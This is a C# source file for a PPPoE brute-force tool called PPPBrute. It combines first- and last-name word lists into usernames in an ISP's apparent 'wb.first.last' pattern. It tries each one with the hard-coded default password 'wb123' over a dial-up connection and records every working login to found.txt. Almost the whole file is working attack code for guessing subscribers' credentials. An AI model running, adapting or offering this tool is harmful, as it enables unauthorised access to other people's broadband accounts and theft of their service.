using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Net;
using DotRas;

namespace PPPBrute
{
    class Program
    {
        const string FirstNamesPath = "firstnames.txt";
        const string SurNamesPath = "surnames.txt";
        const string FoundPath = "found.txt";
        private static IEnumerable<string> _firstNames;
        private static IEnumerable<string> _surNames;
        private const string ConnectorName = "PPPoEBrute";
        static void Main(string[] args)
        {
            if (!LoadWordLists())
                return;
            //Create Connector
            if (!CreateConnector())
                return;
            //Start Brute
            PPPBruteIT();
        }

        // ReSharper disable once InconsistentNaming
        private static void PPPBruteIT()
        {
            RasDialer dialer = new RasDialer
            {
                EntryName = ConnectorName,
                PhoneNumber = " ",
                AllowUseStoredCredentials = true,
                PhoneBookPath = RasPhoneBook.GetPhoneBookPath(RasPhoneBookType.User),
                Timeout = 1000
            };
            foreach (var surname in _surNames)
            {
                foreach (var firstname in _firstNames)
                {
                    string username = ("wb." + firstname + "." + surname).ToLower();//common username
                    string password = "wb123";//Default password
                    try
                    {
                        dialer.Credentials = new NetworkCredential(username, password);
                        RasHandle myras = dialer.Dial();

                        while (myras.IsInvalid)
                        {
                            Console.WriteLine(username + ":" + password + " - Dial failure!");
                        }
                        if (myras.IsInvalid) return;
                        Console.WriteLine(username + ":" + password + " - Dial successful!");
                        RasConnection conn = RasConnection.GetActiveConnectionByHandle(myras);
                        RasIPInfo ipaddr = (RasIPInfo)conn.GetProjectionInfo(RasProjectionType.IP);
                        Console.WriteLine(username + ":" + password + " - Obtained IP " + ipaddr.IPAddress);
                        File.AppendAllText(FoundPath, username + ":" + password + Environment.NewLine);
                        try
                        {
                            ReadOnlyCollection<RasConnection> conList = RasConnection.GetActiveConnections();
                            foreach (RasConnection con in conList)
                            {
                                con.HangUp();
                            }

                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(username + ":" + password + " - Logout abnormal(Exception): " + ex);
                        }
                    }
                    catch (Exception ex)
                    {
                        if (ex.ToString().Contains("user name and password"))
                            Console.WriteLine(username + ":" + password + " - Wrong username/password.");
                        else
                            Console.WriteLine(username + ":" + password + " - Dial Abnormal." + ex);
                    }
                }
            }
        }

        private static bool CreateConnector()
        {
            RasPhoneBook book = new RasPhoneBook();
            try
            {
                book.Open(RasPhoneBook.GetPhoneBookPath(RasPhoneBookType.User));
                if (book.Entries.Contains(ConnectorName))
                {
                    book.Entries[ConnectorName].PhoneNumber = " ";
                    book.Entries[ConnectorName].Update();
                }
                else
                {
                    //ReadOnlyCollection<RasDevice> readOnlyCollection = RasDevice.GetDevices();
                    RasDevice device = RasDevice.GetDevices().First(o => o.DeviceType == RasDeviceType.PPPoE);
                    RasEntry entry = RasEntry.CreateBroadbandEntry(ConnectorName, device);
                    entry.PhoneNumber = " ";
                    book.Entries.Add(entry);
                }
                try
                {
                    ReadOnlyCollection<RasConnection> conList = RasConnection.GetActiveConnections();
                    foreach (RasConnection con in conList)
                    {
                        con.HangUp();
                    }

                }
                catch (Exception ex)
                {
                    Console.WriteLine("General - Logout abnormal(Exception): " + ex);
                }
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Create a PPPoE connection fails(Exception): " + ex);
                return false;
            }
        }

        private static bool LoadWordLists()
        {
            if (!File.Exists(FirstNamesPath))
            {
                Console.WriteLine("firstnames.txt not found.");
                return false;
            }
            if (!File.Exists(SurNamesPath))
            {
                Console.WriteLine("surnames.txt not found.");
                return false;
            }
            _firstNames = File.ReadLines(FirstNamesPath);
            _surNames = File.ReadLines(SurNamesPath);
            return true;
        }
    }
}
